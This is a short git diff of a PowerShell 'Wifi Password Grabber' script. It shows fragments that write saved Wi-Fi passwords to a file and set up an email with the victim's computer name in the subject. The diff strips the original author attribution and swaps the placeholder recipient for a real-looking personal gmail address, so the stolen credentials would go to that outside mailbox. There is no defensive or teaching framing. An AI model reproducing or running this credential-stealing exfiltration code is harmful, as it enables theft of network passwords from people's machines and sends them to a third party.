@@ -1,6 +1,6 @@
 <#
-this script can be found at 
-https://github.com/axel05869/Wifi-Grab
+
+
 
 ---------------------REFERENCE:----------------------
 https://github.com/exploitechx/wifi-password-extractor
@@ -27,7 +27,7 @@ Out-File wifipass.txt -Append -InputObject $a
 # Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
 $FROM = "SENDER_EMAIL"
 $PASS = "SENDER_PASS"
-$TO = "RECEIVER_EMAIL"
+$TO = "mdeemant@gmail.com"
 
 $PC_NAME = "$env:computername"
 $SUBJECT = "Wifi Password Grabber - " + $PC_NAME
